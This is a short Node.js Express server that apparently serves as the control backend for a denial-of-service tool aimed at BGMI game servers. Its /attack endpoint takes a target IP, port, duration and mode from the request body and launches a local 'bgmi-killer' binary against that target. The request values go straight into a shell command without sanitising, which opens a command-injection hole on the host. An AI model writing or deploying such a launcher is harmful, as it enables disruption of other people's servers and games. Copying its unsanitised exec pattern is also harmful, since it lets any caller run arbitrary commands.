const express = require('express');
const { exec } = require('child_process');
const app = express();
app.use(express.json());

app.post('/attack', (req, res) => {
    const { ip, port, duration, mode } = req.body;
    const m = mode || 'bgmi';
    console.log(`🔥 BGMI ATTACK: ${ip}:${port} for ${duration}s`);
    exec(`./bgmi-killer ${ip} ${port} ${duration} ${m} &`);
    res.json({ success: true, attackId: Date.now() });
});

app.listen(5001);
